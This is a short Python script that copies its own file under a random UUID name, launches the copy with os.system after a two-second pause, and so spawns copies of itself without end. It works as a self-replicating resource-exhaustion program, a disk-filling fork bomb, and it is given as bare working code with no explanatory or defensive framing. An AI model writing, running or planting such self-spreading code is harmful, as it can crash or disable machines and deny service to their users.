import pathlib
import shutil
import uuid
import os
import time

def ownFileName():
    filename = os.path.basename(__file__)
    return filename

def newRandomName():
    filename = str(uuid.uuid4()) + ".py"
    return filename

def dupe():
    time.sleep(2)
    path = pathlib.Path(ownFileName())
    if path.exists():
        newFile = newRandomName()
        shutil.copy(ownFileName(), newFile)
        run = os.system(f"python3 {newFile}")

dupe()
